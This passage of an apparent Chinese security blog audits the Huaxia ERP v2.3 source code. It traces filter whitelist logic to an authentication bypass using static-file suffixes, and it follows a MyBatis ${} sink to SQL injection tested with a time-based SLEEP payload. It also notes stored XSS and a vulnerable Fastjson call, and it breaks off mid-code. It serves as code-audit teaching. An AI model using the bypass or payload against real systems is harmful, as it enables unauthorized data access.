<p>找到<code>~/WebGoat/pom.xml</code>用idea打开，选择<code>open as peoject</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529162034060.png" alt="image-20240529162034060"></p>
<p>IDEA会自动下载maven的依赖，时间比较长。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163502058.png" alt="image-20240529163502058"></p>
<p>等依赖下载完成，找到目录：<code>src.main.java.org.owasp#webgoat.server.StartWebGoat</code>点击运行，访问 <a href="http://127.0.0.1:8080/WebGoat/">http://127.0.0.1:8080/WebGoat/</a> 和 <a href="http://127.0.0.1:9090/WebWolf/">http://127.0.0.1:9090/WebWolf/</a> 即可</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529163537696.png" alt="image-20240529163537696"></p>
<h2 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h2><p>大概原因是<code>javax.management.InstanceAlreadyExistsException</code> 导致启动失败。因为 JMX（Java Management Extensions）中的 MBean（Managed Bean）已经存在于 MBean 服务器中，导致无法重复注册。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173118068.png" alt="image-20240529173118068"></p>
<p>选择禁用JMX端点即可</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173328755.png" alt="image-20240529173328755"></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>华夏 ERP CMS v2.3代码审计</title>
    <url>/2025/01/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8D%8E%E5%A4%8FERP_v2.3%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>项目地址:<a href="https://github.com/jishenghua/jshERP/releases/tag/2.3">华夏ERP_v2.3</a></p>
<p>代码审计是每个安全从业者必须要会的技能，遂来学习一波</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="工欲善其事，必先利其器"><a href="#工欲善其事，必先利其器" class="headerlink" title="工欲善其事，必先利其器"></a>工欲善其事，必先利其器</h2><p>先推荐一些对这个项目比较好用的插件</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241007232858319.png" alt="image-20241007232858319"></p>
<p>MyBatisCodeHelperPro 插件有收费功能，但是我们使用免费的功能就够了，可以很方便的跳转到mapper绑定的接口</p>
<p>Rainbow Brackets Lite 彩虹括号，可以提到代码阅读效率</p>
<h2 id="Spring常见注解"><a href="#Spring常见注解" class="headerlink" title="Spring常见注解"></a>Spring常见注解</h2><table>
<thead>
<tr>
<th><strong>注解</strong></th>
<th><strong>作用</strong></th>
<th><strong>使用场景</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>@Component</strong></td>
<td><strong>标记一个类为 Spring 的组件，Spring 会自动检测并将其作为 Bean 注册到 Spring 容器中。</strong></td>
<td><strong>一般用于服务类、工具类、或任何希望被 Spring 容器管理的类。</strong></td>
</tr>
<tr>
<td><strong>@Controller</strong></td>
<td><strong>标记一个类为 Spring MVC 控制器，处理 HTTP 请求并返回视图。</strong></td>
<td><strong>用于 Spring Web 应用中的控制器类，处理前端请求并返回数据或视图。</strong></td>
</tr>
<tr>
<td><strong>@Service</strong></td>
<td><strong>标记一个类为服务层组件，用于定义业务逻辑。</strong></td>
<td><strong>用于业务层的服务类（例如，处理数据库操作或业务逻辑）。</strong></td>
</tr>
<tr>
<td><strong>@Repository</strong></td>
<td><strong>标记一个类为数据访问层组件，通常用于 DAO 类，表示该类主要用于访问数据库。</strong></td>
<td><strong>用于数据层或持久层的组件，Spring 会提供数据库访问的相关异常翻译功能。</strong></td>
</tr>
<tr>
<td><strong>@Autowired</strong></td>
<td><strong>自动注入依赖，Spring 会根据类型来注入 Bean。</strong></td>
<td><strong>用于自动注入 Bean，简化依赖注入的过程。</strong></td>
</tr>
<tr>
<td><strong>@Qualifier</strong></td>
<td><strong>指定要注入的 Bean 的名称，当存在多个同类型的 Bean 时，通过该注解来明确指定注入哪一个 Bean。</strong></td>
<td><strong>当一个类型的 Bean 有多个实例时，用于指定注入特定的 Bean。</strong></td>
</tr>
<tr>
<td><strong>@Resource</strong></td>
<td><strong>与 <code>@Autowired</code> 类似，但基于 Java EE 注解，通常根据 Bean 的名称进行注入。</strong></td>
<td><strong>用于 Java EE 环境，或者希望通过名称注入的场景。</strong></td>
</tr>
<tr>
<td><strong>@Value</strong></td>
<td><strong>用于注入外部配置文件的值（例如，<code>application.properties</code> 或 <code>application.yml</code> 中的配置）。</strong></td>
<td><strong>注入配置文件中的值到类的属性、构造方法或方法参数中。</strong></td>
</tr>
<tr>
<td><strong>@Scope</strong></td>
<td><strong>定义 Bean 的作用域（例如：singleton、prototype 等）。</strong></td>
<td><strong>根据实际需求定义 Bean 的生命周期。</strong></td>
</tr>
<tr>
<td>@PostConstruct</td>
<td>标记一个方法，在 Bean 初始化之后自动执行。</td>
<td>在 Bean 初始化完成后执行某些初始化工作。</td>
</tr>
<tr>
<td>@PreDestroy</td>
<td>标记一个方法，在容器销毁之前执行，用于做清理工作。</td>
<td>在 Bean 销毁之前执行某些清理操作（例如关闭资源、连接等）。</td>
</tr>
<tr>
<td>@Configuration</td>
<td>标记一个类为 Spring 配置类，替代 XML 配置文件，通常用于定义 <code>@Bean</code> 方法。</td>
<td>用于替代传统的 XML 配置文件，定义 Java 配置类。</td>
</tr>
<tr>
<td>@ComponentScan</td>
<td>指定扫描的包路径，Spring 容器会自动扫描并注册该路径下的类。</td>
<td>与 <code>@Configuration</code> 一起使用，指定自动扫描 Bean 的路径。</td>
</tr>
<tr>
<td>@Bean</td>
<td>用于在 Java 配置类中定义一个 Bean，相当于 XML 配置中的 <code>&lt;bean&gt;</code> 元素。</td>
<td>在 Java 配置类中手动定义一个 Bean，并将其加入到 Spring 容器中。</td>
</tr>
<tr>
<td>@PropertySource</td>
<td>指定外部属性文件的位置，Spring 会将文件中的属性值加载到 Spring 环境中。</td>
<td>用于加载配置文件并将文件中的值注入到 Spring 容器中的 Bean 中。</td>
</tr>
<tr>
<td>@Import</td>
<td>导入一个或多个配置类或组件类，使它们成为当前配置类的一部分。</td>
<td>用于导入其他配置类，方便模块化和分离不同的配置。</td>
</tr>
</tbody></table>
<h2 id="JAVAWEB-常见项目结构"><a href="#JAVAWEB-常见项目结构" class="headerlink" title="JAVAWEB 常见项目结构"></a>JAVAWEB 常见项目结构</h2><p><strong>View（视图层）</strong>：</p>
<ul>
<li>负责用户界面展示，直接与用户交互。</li>
<li>显示数据或接受用户输入。</li>
</ul>
<p><strong>Controller（控制层）</strong>：</p>
<ul>
<li>处理视图层的请求，调用服务层完成业务逻辑。</li>
<li>通常对请求参数进行校验，并将结果返回到视图层。</li>
</ul>
<p><strong>Service（服务层）</strong>：</p>
<ul>
<li>封装具体的业务逻辑。</li>
<li>调用 DAO 层与数据库交互，或者与外部服务进行集成。</li>
</ul>
<p><strong>DAO（持久层）</strong>：</p>
<ul>
<li>专门负责与数据库的交互，提供数据的增删改查功能。</li>
<li>通常使用 ORM 框架（如 MyBatis、Hibernate）实现。</li>
</ul>
<p><strong>Entity（实体类）</strong>：</p>
<ul>
<li>数据的实体类，通常与数据库表一一对应。</li>
<li>在持久化操作中充当数据传递的载体。</li>
</ul>
<p>这样说也许还是有点抽象，我们就拿这个项目来给举例一下</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241211110817790.png" alt="image-20241211110817790"></p>
<p>数据走向：</p>
<ul>
<li><p>用户通过 <strong>视图层(View)</strong> 提交请求，数据流入 **控制层(Controller)**。</p>
</li>
<li><p><strong>控制层(Controller)</strong> 接收请求后，调用 <strong>服务层(Service)</strong> 执行业务逻辑。</p>
</li>
<li><p><strong>服务层(Service)</strong> 调用 <strong>DAO 层</strong> 进行数据库操作（例如查询、插入、更新等）。</p>
</li>
<li><p><strong>DAO 层</strong> 通过 <strong>实体类(Entity)</strong> 与数据库交互，最终返回数据。</p>
</li>
<li><p>数据经过多层传递和处理，最终在 <strong>视图层</strong> 展示给用户。</p>
</li>
</ul>
<h1 id="审计准备"><a href="#审计准备" class="headerlink" title="审计准备"></a>审计准备</h1><h2 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h2><p>JAVA的项目一般来讲比较庞大，当我们拿到一个JAVA的项目应该先看什么？代码审计中这个”方向感”特别重要</p>
<ol>
<li>上手第一时间先判断技术栈，可以让我们快速了解程序架构，想到潜在的安全漏洞。</li>
<li>其次这是个maven项目，查看pom.xml文件，它定义了项目的所有依赖、插件以及版本信息，查看项目所依赖的第三方库和它们的版本，以确认是否存在已知的漏洞。 比如这里使用了fastjson，还是有漏洞的版本。</li>
</ol>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241008170542661.png" alt="image-20241008170542661"></p>
<ol start="3">
<li>另外看Filter，为什么看Filter  因为可以看到全局的路由，另外filter是所有请求处理的第一站，这意味着所有潜在的恶意请求在到达Controller之前，都会经过 Filter 进行处理和过滤。另外通过查看filter可以判断应用程序是否存在对用户输入的有效验证和过滤。</li>
</ol>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241008171132192.png" alt="image-20241008171132192"></p>
<figure class="highlight less"><table><tr><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@WebFilter</span>(filterName = <span class="hljs-string">&quot;LogCostFilter&quot;</span>, urlPatterns = &#123;<span class="hljs-string">&quot;/*&quot;</span>&#125;,<br>        initParams = &#123;<span class="hljs-variable">@WebInitParam</span>(name = <span class="hljs-string">&quot;ignoredUrl&quot;</span>, value = <span class="hljs-string">&quot;.css#.js#.jpg#.png#.gif#.ico&quot;</span>),<br>                      <span class="hljs-variable">@WebInitParam</span>(name = <span class="hljs-string">&quot;filterPath&quot;</span>, value = <span class="hljs-string">&quot;/user/login#/user/registerUser#/v2/api-docs&quot;</span>)&#125;)<br><br><span class="hljs-variable">@WebFilter</span> 说明这是一个filter,并对所有的请求路径都有效,<span class="hljs-variable">@WebInitParam</span>用于初始化参数,可以在init方法中使用它们<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20241008190059686.png" alt="image-20241008190059686"></p>
<p><code>com.jsh.erp.filter.LogCostFilter#init</code>方法中对上面<code>@WebInitParam</code>定义的参数用”#”分割</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241008190918885.png" alt="image-20241008190918885"></p>
<p><code>com.jsh.erp.filter.LogCostFilter#doFilter</code>方法是整个filter的核心部分，这里有几种情况是不阻止的：url包含<code>register.html</code>，<code>login.html</code>，以及 <code>doc.html</code>。<code>com.jsh.erp.filter.LogCostFilter#verify</code>是自己定义的一个工具方法，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexPrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;^.*&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">regexSuffix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.*$&quot;</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(List&lt;String&gt; ignoredList, String url)</span> &#123;<br>    <span class="hljs-keyword">for</span> (String regex : ignoredList) &#123;<br>        <span class="hljs-type">Pattern</span> <span class="hljs-variable">pattern</span> <span class="hljs-operator">=</span> Pattern.compile(regexPrefix + regex + regexSuffix);<br>        <span class="hljs-type">Matcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> pattern.matcher(url);<br>        <span class="hljs-keyword">if</span> (matcher.matches()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>将ignoredUrls中的逐个元素拼接成正则表达式后与当前url进行匹配，匹配成功即返回true，例如第一个元素形成的正则表达式为<code>^.*.css.*$</code>，即只要包含ignoredUrls中的任意一个元素即可在不登录的情况下访问</p>
<p>用于检查请求 URL 是否在忽略列表中；也就是看当前访问的连接是不是<code>.css|.js|.jpg|.png|.gif|.ico</code>文件，这些文件也是不阻止的。如果请求的路由是<code>/user/login</code>或<code>/user/registerUser</code>或<code>/v2/api-docs</code>，也是不阻止的。</p>
<ol start="4">
<li>如果想更清楚的了解网站的架构，那路由分析不可少</li>
<li>接下来可以结合网站的功能点，结合代码，寻找脆弱点，当然这个比较靠经验。</li>
</ol>
<h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>大部分请求路径都包含在Controller文件夹中，这里有一个特殊的类，即<code>com.jsh.erp.controller.ResourceController</code>，它的请求路径中包含{apiName}，代码中使用<code>@Resource</code>注解通过名称注入使<code>com.jsh.erp.service.CommonQueryManager类</code>对其进行处理，以<code>com.jsh.erp.service.CommonQueryManager#select</code>方法为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (StringUtil.isNotEmpty(apiName)) &#123;<br>        <span class="hljs-keyword">return</span> container.getCommonQuery(apiName).select(parameterMap);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>它调用了<code>com.jsh.erp.service.InterfaceContainer</code>，其中InterfaceContainer 的init方法会在Spring 容器启动时自动初始化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterfaceContainer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, ICommonQuery&gt; configComponentMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-meta">@Autowired(required = false)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ICommonQuery[] configComponents)</span> &#123;<br>        <span class="hljs-keyword">for</span> (ICommonQuery configComponent : configComponents) &#123;<br>            <span class="hljs-type">ResourceInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> AnnotationUtils.getAnnotation(configComponent, ResourceInfo.class);<br>            <span class="hljs-keyword">if</span> (info != <span class="hljs-literal">null</span>) &#123;<br>                configComponentMap.put(info.value(), configComponent);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ICommonQuery <span class="hljs-title function_">getCommonQuery</span><span class="hljs-params">(String apiName)</span> &#123;<br>        <span class="hljs-keyword">return</span> configComponentMap.get(apiName);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>configComponentMap存放的是ICommonQuery的实现类，即如图所示：</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241214201442220.png" alt="image-20241214201442220"></p>
<ul>
<li><code>@Autowired(required = false)</code>：Spring 在初始化 <code>InterfaceContainer</code> 时，会自动收集所有实现了 <code>ICommonQuery</code> 接口的 Bean，注入到 <code>init</code> 方法的 <code>configComponents</code> 参数中。</li>
<li><code>init</code> 方法逻辑：<ol>
<li>遍历所有注入的 <code>ICommonQuery</code> 实现类。</li>
<li>通过 <code>AnnotationUtils.getAnnotation</code> 检查每个类是否包含 <code>@ResourceInfo</code> 注解。</li>
<li>如果找到注解，则将注解的 <code>value</code> 值作为 key，对应的组件实例作为 value，存入 <code>configComponentMap</code>。</li>
</ol>
</li>
<li>最终结果： <code>configComponentMap</code>其中 key 是 <code>@ResourceInfo</code> 的 <code>value</code>（如 <code>&quot;account&quot;</code>），value 是对应的组件实例（如 <code>AccountComponent</code>）（这就是一些文章说的与目录对应）。</li>
</ul>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241216004531060.png" alt="image-20241216004531060"></p>
<p>初始化完成后，接着以<code>com.jsh.erp.service.account.AccountComponent#select</code>为例。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service(value = &quot;account_component&quot;)</span><br><span class="hljs-meta">@AccountResource</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AccountComponent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICommonQuery</span> &#123;<br><br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> AccountService accountService;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;?&gt; select(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> getAccountList(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> List&lt;?&gt; getAccountList(Map&lt;String, String&gt; map) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">serialNo</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;serialNo&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">remark</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;remark&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>        <span class="hljs-keyword">return</span> accountService.select(name, serialNo, remark, QueryUtils.offset(map), QueryUtils.rows(map));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>调用了<code>com.jsh.erp.service.account.AccountService#select</code>，接着ctrl+鼠标左键<code>select</code>方法就看到到了dao层，进行真正的数据处理。</p>
<p>总结一下就是每个<code>Component</code>类(这里以AccountComponent举例）的<code>@AccountResource</code>注解将<code>@ResourceInfo(value = &quot;account&quot;)</code>和<code>com.jsh.erp.service.account.AccountComponent</code>绑定，在<code>InterfaceContainer</code>类中Spring 启动时会扫描所有实现了 <code>ICommonQuery</code> 接口的组件。通过反射读取每个组件上的 <code>@ResourceInfo</code> 注解的 <code>value</code> 值，将其作为键（<code>apiName</code>），组件实例作为值，存入 <code>configComponentMap</code>。当我们访问接口，比如：<code>GET /account/list</code>。在 <code>Controller</code> 中，<code>apiName</code> 从路径参数中解析出来（<code>@PathVariable(&quot;apiName&quot;)</code>），值为 <code>&quot;account&quot;</code>。<code>CommonQueryManager</code> 将 <code>apiName</code> 传递给 <code>InterfaceContainer</code>。<code>InterfaceContainer</code> 使用 <code>configComponentMap.get(apiName)</code> 查找对应的组件实例，找到 <code>AccountComponent</code>。调用其 <code>select</code> 方法，执行对应的业务逻辑。</p>
<p>数据流：</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><code class="hljs xl">HTTP 请求 -&gt; R<span class="hljs-function"><span class="hljs-title">esourceController</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-title">ommonQueryManager</span> -&gt;</span> I<span class="hljs-function"><span class="hljs-title">nterfaceContainer</span> -&gt;</span> IC<span class="hljs-function"><span class="hljs-title">ommonQuery</span> 实现类 -&gt;</span> DAO 层 -&gt; 数据库<br></code></pre></td></tr></table></figure>

<h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><p>阅读filter代码我们发现加了白，对应的资源加白在 <code>ignoredUrl</code> 中，以 <code>#</code> 分割，看似没什么问题；还有对应的 Path 加白，加了 <code>/user/login</code>，<code>/user/registerUser</code> 以及 <code>/v2/api-docs</code>。</p>
<p>对于加白的思索：是否会存在潜在的未授权访问？对于资源加白 ———— <code>ignoredList</code> 的判断只是进行了正则的判断，这并不符合开发的安全性，正确的写法应该使用 <code>endsWith()</code> 来判断 URL 是否以 <code>.css</code>；<code>.js</code> 等资源后缀结尾</p>
<p>我们去找Controller（上面在介绍常见项目结构的时候也介绍过了，Controller是JavaWeb的入口点）。</p>
<p>直接使用<code>.css|.js|.jpg|.png|.gif|.ico</code>绕过</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022111405315.png" alt="image-20241022111405315"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022111454313.png" alt="image-20241022111454313"></p>
<p>这个接口能看到所有的信息</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250101203233135.png" alt="image-20250101203233135"></p>
<p>对于 URL 加白的思考：使用 <code>startsWith()</code> 方法来判断 URL 是否是白名单开头的时候，可以使用目录穿越来骗过判断，导致可以绕过认证请求。<img src="https://image.sp4rks.xyz/2025/01/image-20241211214031549.png" alt="image-20241211214031549"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022122917387.png" alt="image-20241022122917387"></p>
<h1 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h1><p>其实之前在看filter的时候我们就可以发现，并没有做过滤。我平常的习惯也就是见框就x</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022194258135.png" alt="image-20241022194258135"></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>因为组件是Mybatis，SQL注入在Mybatis框架下一般寻找mapper下的xml文件中的<code>$&#123;&#125;、like、in、order by</code>，因为<code>$&#123;&#125;</code>是字符串替换意思就是咱们输入的字符可以直接作为sql的查询语句，<code>like in order by</code> 不能进行预编译，在过滤不严的情况下也有可能导致sql注入。</p>
<p><code>在mapper_xml文件 ctrl+shift+f 搜索$&#123;</code> </p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022123722647.png" alt="image-20241022123722647"></p>
<p>然后就到了这里，这时候插件的好处就来了，ctrl+鼠标左键点击蓝色的小鸟</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022124121138.png" alt="image-20241022124121138"></p>
<p>直接跳转到对应的接口方法<code>com.jsh.erp.datasource.mappers.UserMapperEx#selectByConditionUser</code>，然后ctrl+鼠标左键找上层调用<img src="https://image.sp4rks.xyz/2025/01/image-20241022160028086.png" alt="image-20241022160028086"></p>
<p>然后就找到了<code>com.jsh.erp.service.user.UserService#select</code> 继续往上找</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022155725036.png" alt="image-20241022155725036"></p>
<p>按住<code>CTRL+鼠标左键</code>然后点击函数，即可看到调用位置为<code>com.jsh.erp.service.user.UserComponent#getUserList</code></p>
<p>可以看到这里的<code>username</code>和<code>password</code>是直接通过<code>com.jsh.erp.utils.StringUtil#getInfo</code>函数获取到的</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022160936325.png" alt="image-20241022160936325"></p>
<p>可以看到在这个函数中调用了<code>fastjson</code>中的<code>com.alibaba.fastjson.JSON#parseObject(java.lang.String)</code>方法，去解析一个变量叫做<code>search</code></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022161209094.png" alt="image-20241022161209094"></p>
<p>还是没有到Controller层，继续Ctrl+B，来到<code>com.jsh.erp.service.CommonQueryManager</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (StringUtil.isNotEmpty(apiName)) &#123;<br>        <span class="hljs-keyword">return</span> container.getCommonQuery(apiName).select(parameterMap);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>继续往上，终于来到<code>ResourceController</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                      <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                      HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>    parameterMap.put(Constants.SEARCH, search);<br>    <span class="hljs-type">PageQueryInfo</span> <span class="hljs-variable">queryInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageQueryInfo</span>();<br>    Map&lt;String, Object&gt; objectMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>    <span class="hljs-keyword">if</span> (pageSize != <span class="hljs-literal">null</span> &amp;&amp; pageSize &lt;= <span class="hljs-number">0</span>) &#123;<br>        pageSize = <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> ParamUtils.getPageOffset(currentPage, pageSize);<br>    <span class="hljs-keyword">if</span> (StringUtil.isNotEmpty(offset)) &#123;<br>        parameterMap.put(Constants.OFFSET, offset);<br>    &#125;<br>    List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);<br><br>    objectMap.put(<span class="hljs-string">&quot;page&quot;</span>, queryInfo);<br>    <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>        queryInfo.setRows(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;());<br>        queryInfo.setTotal(BusinessConstants.DEFAULT_LIST_NULL_NUMBER);<br>        <span class="hljs-keyword">return</span> returnJson(objectMap, <span class="hljs-string">&quot;查找不到数据&quot;</span>, ErpInfo.OK.code);<br>    &#125;<br>    queryInfo.setRows(list);<br>    queryInfo.setTotal(configResourceManager.counts(apiName, parameterMap));<br>    <span class="hljs-keyword">return</span> returnJson(objectMap, ErpInfo.OK.name, ErpInfo.OK.code);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过前面的路由分析可知，这里的apiname为user</p>
<p>正向数据链：</p>
<p>&#x2F;user&#x2F;list——&gt;ResourceController.getList——&gt;CommonQueryManager.select——&gt;UserComponent.select——&gt;UserComponent.getUserList——&gt;UserService.select——&gt;UserMapperEx.selectByConditionUser——&gt;UserMapperEx.xml中id为selectByConditionUser的查询</p>
<p>同样的道理，在这个getList方法中，还有一个select查询，对应的数据链：</p>
<p>&#x2F;user&#x2F;list——&gt;ResourceController.getList——&gt;CommonQueryManager.counts——&gt;UserComponent.counts——&gt;UserService.countUser——&gt;UserMapperEx.countsByUser——&gt;UserMapperEx.xml中id为countsByUser的查询</p>
<p>触发页面</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022162217123.png" alt="image-20241022162217123"></p>
<p>抓个包可以看到确实有userName、loginName参数</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022162425354.png" alt="image-20241022162425354"></p>
<p>我们可以直接来验证一下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;userName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;loginName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&#x27; AND SLEEP(5)--+&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20241022172143088.png" alt="image-20241022172143088"></p>
<h1 id="Fastjson漏洞"><a href="#Fastjson漏洞" class="headerlink" title="Fastjson漏洞"></a>Fastjson漏洞</h1><p>刚开始我们看组件的时候就发现这个fastjson是有漏洞的版本，且在上面sql注入分析的时候就发现<code>com.jsh.erp.utils.StringUtil#getInfo</code>使用了fastjson</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>     <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>     <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>         <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>         value = obj.getString(key);<br>         <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>             value = <span class="hljs-literal">null</span>;<br>         &#125;<br>     &#125;<br>     <span 